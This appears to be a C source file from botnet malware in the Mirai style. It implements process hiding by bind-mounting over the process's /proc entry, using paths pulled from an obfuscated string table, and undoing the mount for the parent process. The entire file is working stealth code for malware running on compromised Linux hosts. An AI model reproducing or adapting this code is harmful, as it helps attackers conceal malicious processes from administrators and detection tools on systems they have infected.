#include <string.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/types.h>

#include "dbg.h"
#include "table.h"

void hide_pid(void) {
#ifndef NOHIDE
    table_unlock_val(TABLE_HIDE_FILE), table_unlock_val(TABLE_HIDE_SELF);

    if (mount(table[TABLE_HIDE_FILE].str, table[TABLE_HIDE_SELF].str, NULL, MS_BIND, NULL) == -1) {
        DEBUG_PRINT("[hide_pid] mount failed pid: (\'%d\')\n", getpid());
    }
    else {
        DEBUG_PRINT("[hide_pid] mount successful pid: (\'%d\')\n", getpid());
    }

    table_lock_val(TABLE_HIDE_FILE), table_lock_val(TABLE_HIDE_SELF);
#endif
}

#ifndef NOHIDE
void int_to_str(int num, char *str) {
    char tmp[20];
    int i = 0, j, len;

    if (num == 0) {
        str[0] = '0';
        str[1] = '\0';
        return;
    }

    while (num > 0) {
        tmp[i++] = (num % 10) + '0';
        num /= 10;
    }

    len = i;
    for (j = 0; j < len; j++) {
        str[j] = tmp[len - j - 1];
    }
    str[len] = '\0';
}
#endif

void unhide_pid(void) {
#ifndef NOHIDE
    pid_t ppid = getppid();
    char pid_str[20];

    char path[32];
    table_unlock_val(TABLE_KILLER_PROC);
    strcpy(path, table[TABLE_KILLER_PROC].str);
    table_lock_val(TABLE_KILLER_PROC);

    int_to_str(ppid, pid_str);
    strcat(path, pid_str);

    if (umount(path) == -1) {
        DEBUG_PRINT("[unhide_pid] umount failed pid: (\'%d\')\n", ppid);
    }
    else {
        DEBUG_PRINT("[unhide_pid] umount successful pid: (\'%d\')\n", ppid);
    }
#endif
}
